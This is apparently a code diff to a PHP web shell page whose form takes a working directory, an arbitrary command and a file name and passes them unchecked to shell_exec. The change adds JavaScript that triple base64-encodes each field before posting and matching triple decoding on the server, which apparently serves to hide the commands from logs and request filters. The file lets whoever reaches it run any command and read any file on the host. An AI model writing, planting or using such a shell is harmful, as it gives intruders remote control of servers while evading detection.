@@ -84,15 +84,20 @@ textarea {
   font-size: 13px;
   font-family: "Courier New", Courier, monospace;
 }
-
-
 </style>
+<script type="text/javascript">
+function convert(){
+  document.getElementsByName("wd")[0].value = btoa(btoa(btoa(document.getElementsByName("wd")[0].value))); 
+  document.getElementsByName("rc")[0].value = btoa(btoa(btoa(document.getElementsByName("rc")[0].value))); 
+  document.getElementsByName("cf")[0].value = btoa(btoa(btoa(document.getElementsByName("cf")[0].value))); 
+}
+</script>
 </head>
 <body>
-<form action="<?php echo $_SERVER['PHP_SELF']; ?>" method='POST'>
+<form onsubmit="convert();" action="<?php echo $_SERVER['PHP_SELF']; ?>" method='POST'>
     <div class="containH"> 
     <div>
-        <p>Working dir: <input type="text" name="wd" value="<?php echo htmlspecialchars($_POST[wd]);?>"></p>
+        <p>Working dir: <input type="text" name="wd" value="<?php echo htmlspecialchars(base64_decode(base64_decode(base64_decode($_POST[wd]))));?>"></p>
         <p>Command: <input type="text" name="rc" value=""></p>
         <p>cat file: <input type="text" name="cf" value=""></p>
     </div> 
@@ -101,13 +106,13 @@ textarea {
     </div>
     </div>
     <pre><center><textarea class="top_pane">
-        <?php echo "\n" . "Working dir: " . htmlspecialchars($_POST[wd]) . "\n" . "Command: " . "ls -al ." . "\n\n"; ?>
-        <?php echo shell_exec("cd " . $_POST[wd] . ";" . "ls -al"); ?>
+        <?php echo "\n" . "Working dir: " . htmlspecialchars(base64_decode(base64_decode(base64_decode($_POST[wd])))) . "\n" . "Command: " . "ls -al ." . "\n\n"; ?>
+        <?php echo shell_exec("cd " . base64_decode(base64_decode(base64_decode($_POST[wd]))) . ";" . "ls -al"); ?>
     </textarea></center></pre>
     <pre><center><textarea class="bottom_pane">
-        <?php echo "\n" . "Working dir: " . htmlspecialchars($_POST[wd]) . "\n" . "Command: " . htmlspecialchars($_POST[rc]) . "\n" . "cat file: " . htmlspecialchars($_POST[cf]) . "\n\n"; ?>
-        <?php echo shell_exec("cd " . $_POST[wd] . ";" . $_POST["rc"]); ?>
-        <?php echo shell_exec("cd " . $_POST[wd] . ";cat " . $_POST[cf]); ?>
+        <?php echo "\n" . "Working dir: " . htmlspecialchars(base64_decode(base64_decode(base64_decode($_POST[wd])))) . "\n" . "Command: " . htmlspecialchars(base64_decode(base64_decode(base64_decode($_POST[rc])))) . "\n" . "cat file: " . htmlspecialchars(base64_decode(base64_decode(base64_decode($_POST[cf])))) . "\n\n"; ?>
+        <?php echo shell_exec("cd " . base64_decode(base64_decode(base64_decode($_POST[wd]))) . ";" . base64_decode(base64_decode(base64_decode($_POST["rc"])))); ?>
+        <?php echo shell_exec("cd " . base64_decode(base64_decode(base64_decode($_POST[wd]))) . ";cat " . base64_decode(base64_decode(base64_decode($_POST[cf])))); ?>
     </textarea></center></pre>
 </form>
 </body>
